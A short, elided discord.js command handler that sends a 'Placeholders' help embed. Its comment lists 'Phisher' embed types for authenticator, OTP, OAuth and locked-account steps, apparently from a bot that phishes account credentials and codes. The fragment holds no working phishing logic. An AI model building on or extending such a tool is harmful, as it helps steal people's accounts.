...
module.exports = {
    ...
    callback: async (client, interaction) => {
        ...
        // Phisher & error embed types (main, authenticator, sec, res, oauth, split, extrabutton, 
        // invalid email, account doesn't exist, invalid, codenotnumbers, otp, howto, 
        // wrongnumber, timeout, blacklisted, locked, nomc, howtoauth)
        embed = new EmbedBuilder()
            .setTitle("Placeholders")
            .setColor(8092543)
            .setDescription(
                "No specific placeholders are available for this embed type.\n\n" +
                "You can use standard Discord markdown formatting in your embed text."
            );
        await interaction.editReply({ embeds: [embed] });
    },
};